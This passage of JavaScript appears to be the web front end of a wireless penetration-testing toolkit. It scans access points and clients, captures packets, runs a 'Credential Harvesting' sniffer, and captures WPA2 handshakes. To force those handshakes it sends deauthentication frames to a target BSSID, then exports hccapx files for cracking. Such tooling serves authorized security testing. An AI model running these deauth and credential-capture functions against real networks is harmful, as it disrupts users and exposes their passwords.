            for (let retry = 0; retry < 6; retry++) {
                await new Promise(r => setTimeout(r, 5000));
                const check = await api('/api/pentest/quickcheck', 'POST', { iface: iface2 });
                if (check.connected && check.ip) {
                    data.error = null;
                    data.connected = true;
                    data.ip = check.ip;
                    data.message = `Connected to ${n.ssid} (${check.ip})`;
                    data.ssid = check.ssid || n.ssid;
                    break;
                }
            }
        }
    }

    if (data.error) {
        // Mark remaining steps
        while (results.length < 4) results.push(results.length < 2);
        if (data.phase === 'auth') {
            results[2] = false;  // association failed
        }
        renderProgress(4, results);
        wifiSetStatus('error', data.error);
        toast(data.error, 'error');

        // Show back button to try again
        progressEl.innerHTML += `<div style="margin-top:0.75rem; display:flex; gap:0.5rem;">
            <button class="btn btn-primary btn-sm" onclick="wifiBackToList()">Try Another Network</button>
            <button class="btn btn-sm" onclick="wifiHideConnect()">Close</button>
        </div>`;
        return;
    }

    // Check if we actually got an IP
    if (!data.connected) {
        // Associated but DHCP failed
        results.length = 0;
        results.push(true, true, true, false);  // steps 0-2 ok, step 3 (DHCP) failed
        renderProgress(4, results);
        wifiSetStatus('error', 'DHCP failed — associated but no IP address');
        toast('DHCP failed — no IP address obtained', 'error');

        // Show diagnostic info from server steps
        let diagInfo = '';
        if (data.steps && data.steps.length > 0) {
            diagInfo = `<div style="margin-top:0.5rem; background:#0d1117; border:1px solid #30363d; border-radius:4px; padding:0.5rem; font-family:monospace; font-size:0.7rem; color:#8b949e; max-height:120px; overflow-y:auto;">${data.steps.map(s => esc(s)).join('<br>')}</div>`;
        }

        progressEl.innerHTML += `<div style="margin-top:0.75rem; padding:0.5rem 0.75rem; background:#d29922; border-radius:6px; font-family:inherit; font-size:0.85rem; color:#000;">
            Associated with ${esc(n.ssid)} but DHCP failed. Check that the network has a DHCP server.
        </div>
        ${diagInfo}
        <div style="margin-top:0.5rem; display:flex; gap:0.5rem;">
            <button class="btn btn-warning btn-sm" onclick="wifiRetryDhcp()">Retry DHCP</button>
            <button class="btn btn-primary btn-sm" onclick="wifiHideConnect(); ptNetInfo();">Close</button>
        </div>`;
        return;
    }

    // Full success
    results.length = 0;
    results.push(true, true, true, true);
    renderProgress(4, results);

    wifiSetStatus('connected', data.message || `Connected to ${n.ssid}`);
    toast(data.message || 'Connected!', 'success');

    // Show success message with close button
    progressEl.innerHTML += `<div style="margin-top:0.75rem; padding:0.5rem 0.75rem; background:#238636; border-radius:6px; font-family:inherit; font-size:0.85rem; color:#fff;">
        \u2713 ${esc(data.message || 'Connected to ' + n.ssid)}${data.ip ? ' (' + esc(data.ip) + ')' : ''}
    </div>
    <div style="margin-top:0.5rem; display:flex; gap:0.5rem;">
        <button class="btn btn-primary btn-sm" onclick="wifiHideConnect(); ptNetInfo();">Done</button>
    </div>`;
}

async function wifiRetryDhcp() {
    const iface = ptIface();
    if (!iface) { toast('No interface', 'error'); return; }

    const progressEl = document.getElementById('wifi-progress-steps');
    wifiSetStatus('connecting', 'Retrying DHCP...');
    progressEl.innerHTML = '<div class="wifi-prog-step active"><span class="wifi-prog-icon">\u25CF</span>Requesting IP address via DHCP...</div>';

    const data = await api('/api/pentest/retrydhcp', 'POST', { iface });

    if (data.connected && data.ip) {
        wifiSetStatus('connected', `Got IP: ${data.ip}`);
        toast(`Connected with IP ${data.ip}`, 'success');
        progressEl.innerHTML = `<div class="wifi-prog-step done"><span class="wifi-prog-icon">\u2713</span>DHCP successful — ${esc(data.ip)}</div>`;

        // Show diagnostic steps
        if (data.steps && data.steps.length > 0) {
            progressEl.innerHTML += `<div style="margin-top:0.5rem; background:#0d1117; border:1px solid #30363d; border-radius:4px; padding:0.5rem; font-family:monospace; font-size:0.7rem; color:#8b949e; max-height:100px; overflow-y:auto;">${data.steps.map(s => esc(s)).join('<br>')}</div>`;
        }

        progressEl.innerHTML += `<div style="margin-top:0.75rem; padding:0.5rem 0.75rem; background:#238636; border-radius:6px; font-family:inherit; font-size:0.85rem; color:#fff;">
            \u2713 Connected (${esc(data.ip)})
        </div>
        <div style="margin-top:0.5rem;"><button class="btn btn-primary btn-sm" onclick="wifiHideConnect(); ptNetInfo();">Done</button></div>`;
    } else {
        wifiSetStatus('error', 'DHCP retry failed');
        toast('DHCP retry failed', 'error');

        let diagInfo = '';
        if (data.steps && data.steps.length > 0) {
            diagInfo = `<div style="margin-top:0.5rem; background:#0d1117; border:1px solid #30363d; border-radius:4px; padding:0.5rem; font-family:monospace; font-size:0.7rem; color:#8b949e; max-height:120px; overflow-y:auto;">${data.steps.map(s => esc(s)).join('<br>')}</div>`;
        }

        progressEl.innerHTML = `<div class="wifi-prog-step fail"><span class="wifi-prog-icon">\u2717</span>DHCP retry failed</div>
        ${diagInfo}
        <div style="margin-top:0.5rem; display:flex; gap:0.5rem;">
            <button class="btn btn-warning btn-sm" onclick="wifiRetryDhcp()">Retry Again</button>
            <button class="btn btn-primary btn-sm" onclick="wifiHideConnect();">Close</button>
        </div>`;
    }
}

// Close WiFi modal on overlay click
document.getElementById('wifi-overlay')?.addEventListener('click', (e) => {
    if (e.target === e.currentTarget) wifiHideConnect();
});

// Allow Enter key to submit password
document.getElementById('wifi-password')?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') wifiDoConnect();
});

// ── NetworkManager control ──────────────────────────────────────────────────

async function nmStop() {
    const data = await api('/api/nm/stop', 'POST');
    if (data.error) {
        toast(data.error, 'error');
    } else {
        toast('NetworkManager stopped', 'success');
        refreshStatus();
    }
}

async function nmStart() {
    const data = await api('/api/nm/start', 'POST');
    if (data.error) {
        toast(data.error, 'error');
    } else {
        toast('NetworkManager started', 'success');
        refreshStatus();
    }
}

// ── Auto-populate interface fields ─────────────────────────────────────────

async function populateInterfaces() {
    const data = await api('/api/interfaces');
    if (!data.interfaces || data.interfaces.length === 0) return;
    const base = data.interfaces.find(i => !i.name.endsWith('mon')) || data.interfaces[0];
    const firstIface = base.name.endsWith('mon') ? base.name.slice(0, -3) : base.name;
    // Pre-fill all interface inputs that are still empty
    ['wiz-scan-iface', 'mode-iface', 'iface1', 'pt-iface'].forEach(id => {
        const el = document.getElementById(id);
        if (el && !el.value) el.value = firstIface;
    });
    // If there's a second interface, pre-fill iface2
    if (data.interfaces.length > 1) {
        const el = document.getElementById('iface2');
        if (el && !el.value) el.value = data.interfaces[1].name;
    }
}

// ── Recon Tab ────────────────────────────────────────────────────────────────

function reconTabLoad() {
    // Pre-fill interface fields (strip mon suffix, same pattern as attackTabLoad)
    api('/api/interfaces').then(data => {
        if (!data || !data.interfaces) return;
        const ifaces = data.interfaces || [];
        const base = ifaces.find(i => !i.name.endsWith('mon')) || ifaces[0];
        if (!base) return;
        const name = base.name.endsWith('mon') ? base.name.slice(0, -3) : base.name;
        ['recon-ap-iface', 'recon-client-iface'].forEach(id => {
            const el = document.getElementById(id);
            if (el && !el.value) el.value = name;
        });
    });
}

async function reconScanAPs() {
    const iface = document.getElementById('recon-ap-iface').value.trim();
    const btn = document.getElementById('recon-scan-btn');
    btn.disabled = true;
    btn.textContent = 'Scanning…';

    document.getElementById('recon-ap-results').classList.add('hidden');
    document.getElementById('recon-ap-empty').classList.add('hidden');

    const data = await api('/api/recon/scan-aps', 'POST', { iface });

    btn.disabled = false;
    btn.innerHTML = '&#128225;&nbsp; Scan APs';

    if (data.error) { toast('Scan failed: ' + data.error, 'error'); return; }

    const aps = data.aps || [];
    if (aps.length === 0) {
        document.getElementById('recon-ap-empty').classList.remove('hidden');
        return;
    }

    document.getElementById('recon-ap-count').textContent = `${aps.length} AP${aps.length !== 1 ? 's' : ''} found`;
    const tbody = document.getElementById('recon-ap-tbody');
    tbody.innerHTML = '';
    aps.forEach(ap => {
        const sigColor = ap.signal >= -60 ? '#3fb950' : ap.signal >= -75 ? '#f0883e' : '#8b949e';
        const secColor = ap.security === 'Open' ? '#f85149' : '#3fb950';
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="font-weight:600;">${esc(ap.ssid || '(hidden)')}</td>
            <td style="font-family:monospace; font-size:0.85em;">${esc(ap.bssid)}</td>
            <td style="text-align:center;">${ap.channel || '?'}</td>
            <td style="color:${sigColor}; font-family:monospace;">${ap.signal} dBm</td>
            <td style="color:${secColor};">${esc(ap.security)}</td>
            <td><button class="btn btn-sm" style="padding:0.15rem 0.5rem; font-size:0.75rem; background:#21262d; border:1px solid #30363d; color:#8b949e;"
                onclick="_populateHsBssid('${esc(ap.bssid)}', ${ap.channel || 1})">Use</button></td>`;
        tbody.appendChild(tr);
    });
    document.getElementById('recon-ap-results').classList.remove('hidden');
}

async function reconDiscoverClients() {
    const iface = document.getElementById('recon-client-iface').value.trim();
    const btn = document.getElementById('recon-client-btn');
    btn.disabled = true;
    btn.textContent = 'Scanning…';

    document.getElementById('recon-client-results').classList.add('hidden');
    document.getElementById('recon-client-empty').classList.add('hidden');

    const data = await api('/api/recon/clients', 'POST', { iface });

    btn.disabled = false;
    btn.innerHTML = '&#128270;&nbsp; Discover Clients';

    if (data.error) { toast('Discovery failed: ' + data.error, 'error'); return; }

    const clients = data.clients || [];
    if (clients.length === 0) {
        document.getElementById('recon-client-empty').classList.remove('hidden');
        return;
    }

    document.getElementById('recon-client-count').textContent = `${clients.length} client${clients.length !== 1 ? 's' : ''} found`;
    const tbody = document.getElementById('recon-client-tbody');
    tbody.innerHTML = '';
    clients.forEach(c => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="font-family:monospace;">${esc(c.ip)}</td>
            <td style="font-family:monospace; font-size:0.85em;">${esc(c.mac)}</td>
            <td style="color:#8b949e;">${esc(c.vendor)}</td>`;
        tbody.appendChild(tr);
    });
    document.getElementById('recon-client-results').classList.remove('hidden');
}

function _populateHsBssid(bssid, channel) {
    // Switch to Capture tab and fill in handshake fields
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    const captureBtn = document.querySelector('[data-tab="capture"]');
    if (captureBtn) captureBtn.classList.add('active');
    const captureTab = document.getElementById('tab-capture');
    if (captureTab) captureTab.classList.add('active');
    captureTabLoad();

    document.getElementById('hs-bssid').value = bssid;
    document.getElementById('hs-channel').value = channel;
    toast(`BSSID ${bssid} loaded into Capture tab`, 'success');
}

// ── Capture Tab ───────────────────────────────────────────────────────────────

function captureTabLoad() {
    api('/api/interfaces').then(data => {
        if (!data || !data.interfaces) return;
        const ifaces = data.interfaces || [];
        const base = ifaces.find(i => !i.name.endsWith('mon')) || ifaces[0];
        if (!base) return;
        const name = base.name.endsWith('mon') ? base.name.slice(0, -3) : base.name;
        ['pcap-iface', 'cred-iface', 'hs-iface'].forEach(id => {
            const el = document.getElementById(id);
            if (el && !el.value) el.value = name;
        });
    });
}

// ── PCAP Capture ─────────────────────────────────────────────────────────────

let _pcapRunning = false;

async function pcapStart() {
    const iface = document.getElementById('pcap-iface').value.trim();
    const filter = document.getElementById('pcap-filter').value.trim();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    const data = await api('/api/capture/pcap-start', 'POST', { iface, filter });
    if (data.error) { toast('Failed to start: ' + data.error, 'error'); return; }

    _pcapRunning = true;
    document.getElementById('pcap-start-btn').disabled = true;
    document.getElementById('pcap-stop-btn').disabled = false;
    document.getElementById('pcap-dl-btn').disabled = true;
    document.getElementById('pcap-status').textContent = `Capturing on ${iface}… stop when done.`;
    toast('Capture started', 'success');
}

async function pcapStop() {
    const data = await api('/api/capture/pcap-stop', 'POST', {});
    _pcapRunning = false;
    document.getElementById('pcap-start-btn').disabled = false;
    document.getElementById('pcap-stop-btn').disabled = true;

    if (data.error) {
        document.getElementById('pcap-status').textContent = data.error;
        return;
    }
    const kb = (data.size_bytes / 1024).toFixed(1);
    document.getElementById('pcap-status').textContent =
        `Stopped. ${kb} KB captured in ${data.duration_s}s. Ready to download.`;
    document.getElementById('pcap-dl-btn').disabled = data.size_bytes === 0;
    if (data.size_bytes > 0) toast('Capture saved — click Download PCAP', 'success');
}

function pcapDownload() {
    window.location = '/api/capture/pcap-download';
}

// ── Credential Harvesting ────────────────────────────────────────────────────

let _credPollTimer = null;

async function credStart() {
    const iface = document.getElementById('cred-iface').value.trim();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    const data = await api('/api/capture/cred-start', 'POST', { iface });
    if (data.error) { toast('Failed: ' + data.error, 'error'); return; }

    document.getElementById('cred-start-btn').disabled = true;
    document.getElementById('cred-stop-btn').disabled = false;
    document.getElementById('cred-output').textContent = '';
    document.getElementById('cred-status').textContent = `Harvesting on ${iface}…`;
    toast('Credential harvesting started', 'success');

    _credPollTimer = setInterval(_credPoll, 2000);
}

async function _credPoll() {
    const data = await api('/api/capture/cred-poll');
    if (!data || data.error) return;
    const pre = document.getElementById('cred-output');
    if (data.lines && data.lines.length > 0) {
        pre.textContent = data.lines.join('\n');
        pre.scrollTop = pre.scrollHeight;
    }
    document.getElementById('cred-status').textContent =
        `${data.running ? 'Harvesting…' : 'Stopped.'} ${data.count} credential lines captured.`;
    if (!data.running) {
        clearInterval(_credPollTimer);
        _credPollTimer = null;
        document.getElementById('cred-start-btn').disabled = false;
        document.getElementById('cred-stop-btn').disabled = true;
    }
}

async function credStop() {
    if (_credPollTimer) { clearInterval(_credPollTimer); _credPollTimer = null; }
    const data = await api('/api/capture/cred-stop', 'POST', {});
    document.getElementById('cred-start-btn').disabled = false;
    document.getElementById('cred-stop-btn').disabled = true;
    const pre = document.getElementById('cred-output');
    if (data.lines && data.lines.length > 0) {
        pre.textContent = data.lines.join('\n');
    }
    document.getElementById('cred-status').textContent = `Stopped. ${data.count || 0} credential lines captured.`;
    toast('Harvesting stopped', 'success');
}

function credClear() {
    document.getElementById('cred-output').textContent = 'Waiting for credentials…';
    document.getElementById('cred-status').textContent = '';
}

// ── WPA2 Handshake Capture ───────────────────────────────────────────────────

let _hsPollTimer = null;

async function hsStart() {
    const iface = document.getElementById('hs-iface').value.trim();
    const bssid = document.getElementById('hs-bssid').value.trim();
    const channel = document.getElementById('hs-channel').value.trim();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    if (!bssid) { toast('Enter target BSSID', 'error'); return; }
    if (!channel) { toast('Enter channel', 'error'); return; }

    const btn = document.getElementById('hs-start-btn');
    btn.disabled = true;
    btn.textContent = 'Starting…';

    const data = await api('/api/capture/handshake-start', 'POST', { iface, bssid, channel });

    btn.textContent = '▶ Start Monitor + Capture';

    if (data.error) {
        btn.disabled = false;
        toast('Failed: ' + data.error, 'error');
        return;
    }

    document.getElementById('hs-deauth-btn').disabled = false;
    document.getElementById('hs-stop-btn').disabled = false;
    document.getElementById('hs-dl-btn').disabled = true;
    document.getElementById('hs-output-area').classList.remove('hidden');
    document.getElementById('hs-output').textContent = '';
    _hsSetStatus('waiting', `Capturing on ${data.mon_iface} — waiting for handshake…`);
    toast(`airodump-ng started on ${data.mon_iface}`, 'success');

    _hsPollTimer = setInterval(_hsPoll, 3000);
}

async function _hsPoll() {
    const data = await api('/api/capture/handshake-poll');
    if (!data || data.error) return;

    if (data.handshake_found) {
        clearInterval(_hsPollTimer);
        _hsPollTimer = null;
        _hsSetStatus('captured', '&#10003; HANDSHAKE CAPTURED — click Stop + Export hccapx');
        toast('WPA2 handshake captured!', 'success');
    } else if (!data.running) {
        clearInterval(_hsPollTimer);
        _hsPollTimer = null;
        _hsSetStatus('error', 'airodump-ng stopped unexpectedly');
    }
}

async function hsDeauth() {
    const iface = document.getElementById('hs-iface').value.trim();
    const bssid = document.getElementById('hs-bssid').value.trim();
    const btn = document.getElementById('hs-deauth-btn');
    btn.disabled = true;
    btn.textContent = 'Sending…';

    const data = await api('/api/capture/handshake-deauth', 'POST', { iface, bssid });

    btn.disabled = false;
    btn.innerHTML = '&#9889;&nbsp; Send Deauth';
    if (data.error) { toast('Deauth failed: ' + data.error, 'error'); return; }
    toast('Deauth frames sent — watch for handshake', 'success');
    if (data.output) {
        const pre = document.getElementById('hs-output');
        pre.textContent += '\n[deauth]\n' + data.output;
        pre.scrollTop = pre.scrollHeight;
    }
}

async function hsStop() {
    if (_hsPollTimer) { clearInterval(_hsPollTimer); _hsPollTimer = null; }

    const btn = document.getElementById('hs-stop-btn');
    btn.disabled = true;
    btn.textContent = 'Exporting…';

    const data = await api('/api/capture/handshake-stop', 'POST', {});

    btn.textContent = '■ Stop + Export hccapx';

    document.getElementById('hs-start-btn').disabled = false;
    document.getElementById('hs-deauth-btn').disabled = true;

    if (data.status === 'done' && data.hccapx_size > 0) {
        const kb = (data.hccapx_size / 1024).toFixed(1);
        _hsSetStatus('captured', `&#10003; hccapx exported (${kb} KB) — ready to download`);
        document.getElementById('hs-dl-btn').disabled = false;
        toast('hccapx exported — click Download', 'success');
    } else {
        _hsSetStatus('error', 'Export failed or no handshake in capture. ' + (data.output || ''));
        document.getElementById('hs-dl-btn').disabled = true;
        toast('hccapx export failed — check output', 'error');
    }

    if (data.output) {
        const pre = document.getElementById('hs-output');
        pre.textContent += '\n[convert]\n' + data.output;
        pre.scrollTop = pre.scrollHeight;
    }
}

function hsDownload() {
    window.location = '/api/capture/handshake-download';
}

function _hsSetStatus(type, html) {
    const banner = document.getElementById('hs-status-banner');
    const cls = type === 'captured' ? 'hs-status-captured' :
                type === 'error'    ? 'hs-status-error' : 'hs-status-waiting';
    banner.innerHTML = `<div class="${cls}">${html}</div>`;
}

// ── Init ────────────────────────────────────────────────────────────────────

refreshStatus();
refreshInterfaces();
refreshUSB();
populateInterfaces();
setInterval(refreshStatus, 10000);

// Auto-show wizard if no config exists (only on first load)
(async () => {
    const data = await api('/api/config/check');
    if (!data.configured && !wizConfigured) wizShow();
})();
